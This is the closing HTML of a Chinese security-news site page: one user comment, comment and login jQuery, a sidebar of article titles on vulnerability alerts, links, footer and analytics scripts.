                                    <img src="/img/photo/7x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="4256" user-name="情痴牛" href="javascript:;">
                情痴牛            </a>
                        <span class="comment-time">2016-09-20 16:36:47</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4256">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4256" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">k0师傅贼强，我要跪舔你</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3043" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
